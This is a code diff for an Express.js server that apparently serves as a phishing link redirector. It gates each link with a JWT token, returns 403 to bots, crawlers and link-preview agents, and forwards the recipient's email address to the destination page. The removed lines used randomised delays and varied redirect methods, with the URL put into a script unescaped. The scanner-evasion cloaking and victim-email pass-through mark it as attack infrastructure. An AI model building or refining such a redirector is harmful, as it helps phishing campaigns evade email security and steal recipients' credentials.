@@ -96,52 +96,61 @@ app.post('/add-redirect', (req, res) => {
 });
 
 // Handle query-based redirects
-app.get('/:key', (req, res) => {
-    const key = req.params.key;
-    const token = req.query.token;
+app.get('/:key/:token/:email?', (req, res) => {
+    const { key, token, email: emailFromPath } = req.params;
+    const emailFromQuery = req.query.email;
 
+    // Determine the source of the email (path or query)
+    let email = emailFromPath || emailFromQuery;
+
+    // Decode the email if it exists
+    if (email) {
+        try {
+            email = decodeURIComponent(email); // Decode %40 to @
+        } catch (err) {
+            console.error('Error decoding email:', err);
+            return res.status(400).send('Invalid email encoding.');
+        }
+    }
+
+    // Basic bot filtering
     const userAgent = req.headers['user-agent'] || '';
     if (/bot|crawl|spider|preview/i.test(userAgent)) {
         return res.status(403).send('Access denied.');
     }
 
+    // Validate the decoded email
+    if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        return res.status(400).send('Invalid email format.');
+    }
+
     try {
+        // Validate and decode the JWT token
         const decoded = jwt.verify(token, JWT_SECRET);
         const redirects = loadRedirects();
 
+        // Check if the key exists in the redirects
         if (redirects[key] && decoded.key === key) {
-            const randomDelay = Math.floor(Math.random() * 3) + 2; // Random delay (2-5s)
-            const useMetaRefresh = Math.random() < 0.5; // 50% chance to use meta refresh
-            if (useMetaRefresh) {
-                res.send(
-                    `<html>
-                        <head>
-                            <meta http-equiv="refresh" content="${randomDelay};url=${redirects[key]}" />
-                        </head>
-                        <body>
-                            
-                        </body>
-                    </html>`
-                );
-            } else {
-                res.send(
-                    `<html>
-                        <body>
-                            <script>
-                                setTimeout(() => { window.location.href = '${redirects[key]}'; }, ${randomDelay * 1000});
-                            </script>
-                            
-                        </body>
-                    </html>`
-                );
+            let destination = redirects[key];
+
+            // Append the email to the destination URL if it exists
+            if (email) {
+                const urlObj = new URL(destination);
+                urlObj.searchParams.append('email', email); // Add email as a query parameter
+                destination = urlObj.toString();
             }
+
+            // Send the redirect response
+            res.redirect(destination);
         } else {
             res.status(404).send('Invalid or expired redirect.');
         }
     } catch (err) {
+        console.error('Error during redirection:', err);
         res.status(403).send('Invalid or expired token.');
     }
 });
+
 
 // Handle path-based redirects
 app.get('/:key/:token', (req, res) => {
